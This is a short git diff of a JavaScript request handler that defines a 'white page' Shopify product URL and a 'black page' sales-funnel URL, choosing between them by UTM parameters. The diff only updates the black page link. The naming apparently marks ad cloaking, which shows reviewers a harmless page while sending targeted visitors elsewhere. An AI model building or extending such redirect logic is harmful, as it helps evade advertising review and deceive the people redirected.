@@ -1,7 +1,7 @@
 export default function handler(req, res) {
     // URLs to redirect
     const whitePageURL = "https://hifi-live.myshopify.com/products/hi-fi-stainless-steel-40oz-black-tumbler-with-handle?srsltid=AfmBOoq-BjwJKNQbECDNHwQF34C1SztG0exi55bPcGDAv32AnVk9ChTR";
-    const blackPageURL = "https://IFRXJwhbvB.myfunnelish.com/imbassd-1736979042571105-1738006308191131";
+    const blackPageURL = "https://ifrxjwhbvb.myfunnelish.com/imbassd-1736979042571105-1738006308191131-1738511238414243";
   
     // Parse the UTM parameters from the request URL
     const queryParams = new URLSearchParams(req.url.split('?')[1]);
